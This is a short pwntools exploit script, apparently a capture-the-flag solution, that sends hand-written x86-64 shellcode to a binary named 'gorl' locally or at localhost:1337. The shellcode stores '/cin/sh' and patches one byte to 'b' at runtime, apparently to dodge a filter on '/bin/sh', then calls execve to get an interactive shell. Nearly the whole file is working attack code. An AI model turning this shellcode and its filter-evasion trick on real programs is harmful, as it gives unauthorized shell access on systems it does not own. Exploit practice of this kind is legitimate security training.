from pwn import *


binary = "./gorl"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("localhost", 1337)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### START HERE ###
code = """
xor   esi, esi	                # clear esi
xor   edx, edx                  # clear edx
nop
mov   rdi, 0x68732f6e69632f     # /cin/sh in reverse order
push  rdi
nop
mov   BYTE PTR [rsp+0x1], 0x62  # b
mov   rdi, rsp                  # rdi = rsp
mov   al, 59                    # sys_execve
nop
syscall
"""

shellcode = asm(code)
print(len(shellcode))
print(shellcode)

p.sendline(shellcode)


p.interactive()